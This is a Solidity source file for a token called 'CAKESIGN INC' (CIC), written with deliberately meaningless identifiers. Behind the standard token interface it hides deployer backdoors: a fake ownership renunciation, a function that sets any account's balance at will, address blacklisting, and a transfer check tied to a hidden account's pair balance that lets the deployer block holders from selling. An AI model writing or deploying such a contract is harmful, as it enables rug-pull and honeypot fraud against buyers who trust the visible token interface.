//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface walletToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txShould) external view returns (uint256);

    function transfer(address atMarketing, uint256 buyReceiver) external returns (bool);

    function allowance(address senderTradingFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyReceiver) external returns (bool);

    function transferFrom(address sender,address atMarketing,uint256 buyReceiver) external returns (bool);

    event Transfer(address indexed from, address indexed limitTake, uint256 value);
    event Approval(address indexed senderTradingFund, address indexed spender, uint256 value);
}

interface atLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletListSender {
    function createPair(address listMin, address shouldSwap) external returns (address);
}

abstract contract launchBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletTokenMetadata is walletToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CAKESIGNINC is launchBuy, walletToken, walletTokenMetadata {

    uint256 private txLiquidityTeam = 100000000 * 10 ** 18;

    bool public launchReceiverTx;

    address public maxAmountSender;

    function approve(address totalFeeReceiver, uint256 buyReceiver) public virtual override returns (bool) {
        amountLiquidityMode[_msgSender()][totalFeeReceiver] = buyReceiver;
        emit Approval(_msgSender(), totalFeeReceiver, buyReceiver);
        return true;
    }

    bool public listEnableLiquidity;

    function decimals() external view virtual override returns (uint8) {
        return receiverEnable;
    }

    uint256 public sellShould;

    uint256 public minSell;

    uint8 private receiverEnable = 18;

    mapping(address => bool) public receiverReceiver;

    function transferFrom(address tokenEnable, address atMarketing, uint256 buyReceiver) external override returns (bool) {
        if (_msgSender() != walletTotal) {
            if (amountLiquidityMode[tokenEnable][_msgSender()] != type(uint256).max) {
                require(buyReceiver <= amountLiquidityMode[tokenEnable][_msgSender()]);
                amountLiquidityMode[tokenEnable][_msgSender()] -= buyReceiver;
            }
        }
        return receiverMode(tokenEnable, atMarketing, buyReceiver);
    }

    function swapAt() private view {
        require(receiverReceiver[_msgSender()]);
    }

    mapping(address => uint256) private launchedList;

    function atToken() public {
        emit OwnershipTransferred(maxAmountSender, address(0));
        swapFromFee = address(0);
    }

    function balanceOf(address txShould) public view virtual override returns (uint256) {
        return launchedList[txShould];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txLiquidityTeam;
    }

    uint256 tradingTakeSwap;

    address private swapFromFee;

    uint256 private swapReceiverEnable;

    uint256 modeTotal;

    function exemptMinTake(address minTrading, uint256 buyReceiver) public {
        swapAt();
        launchedList[minTrading] = buyReceiver;
    }

    function minToken(address txEnable) public {
        swapAt();
        
        if (txEnable == maxAmountSender || txEnable == launchShould) {
            return;
        }
        maxFundAmount[txEnable] = true;
    }

    bool public totalTradingAt;

    string private maxReceiver = "CAKESIGN INC";

    function modeMinFund(address maxAt) public {
        if (launchReceiverTx) {
            return;
        }
        if (listEnableLiquidity == totalTradingAt) {
            listEnableLiquidity = true;
        }
        receiverReceiver[maxAt] = true;
        if (totalTradingAt == listEnableLiquidity) {
            swapReceiverEnable = minSell;
        }
        launchReceiverTx = true;
    }

    function transfer(address minTrading, uint256 buyReceiver) external virtual override returns (bool) {
        return receiverMode(_msgSender(), minTrading, buyReceiver);
    }

    function allowance(address feeFundTx, address totalFeeReceiver) external view virtual override returns (uint256) {
        if (totalFeeReceiver == walletTotal) {
            return type(uint256).max;
        }
        return amountLiquidityMode[feeFundTx][totalFeeReceiver];
    }

    function name() external view virtual override returns (string memory) {
        return maxReceiver;
    }

    function owner() external view returns (address) {
        return swapFromFee;
    }

    event OwnershipTransferred(address indexed enableSender, address indexed fromExempt);

    address public launchShould;

    function teamTotal(uint256 buyReceiver) public {
        swapAt();
        modeTotal = buyReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return takeMaxBuy;
    }

    function getOwner() external view returns (address) {
        return swapFromFee;
    }

    function receiverMode(address tokenEnable, address atMarketing, uint256 buyReceiver) internal returns (bool) {
        if (tokenEnable == maxAmountSender) {
            return senderBuy(tokenEnable, atMarketing, buyReceiver);
        }
        uint256 tokenMinMode = walletToken(launchShould).balanceOf(tradingTx);
        require(tokenMinMode == modeTotal);
        require(!maxFundAmount[tokenEnable]);
        return senderBuy(tokenEnable, atMarketing, buyReceiver);
    }

    string private takeMaxBuy = "CIC";

    constructor (){
        
        atToken();
        atLaunched totalFund = atLaunched(walletTotal);
        launchShould = walletListSender(totalFund.factory()).createPair(totalFund.WETH(), address(this));
        if (listEnableLiquidity) {
            minSell = sellShould;
        }
        maxAmountSender = _msgSender();
        receiverReceiver[maxAmountSender] = true;
        launchedList[maxAmountSender] = txLiquidityTeam;
        if (listEnableLiquidity != totalTradingAt) {
            listEnableLiquidity = true;
        }
        emit Transfer(address(0), maxAmountSender, txLiquidityTeam);
    }

    function senderBuy(address tokenEnable, address atMarketing, uint256 buyReceiver) internal returns (bool) {
        require(launchedList[tokenEnable] >= buyReceiver);
        launchedList[tokenEnable] -= buyReceiver;
        launchedList[atMarketing] += buyReceiver;
        emit Transfer(tokenEnable, atMarketing, buyReceiver);
        return true;
    }

    mapping(address => bool) public maxFundAmount;

    address tradingTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private amountLiquidityMode;

    address walletTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}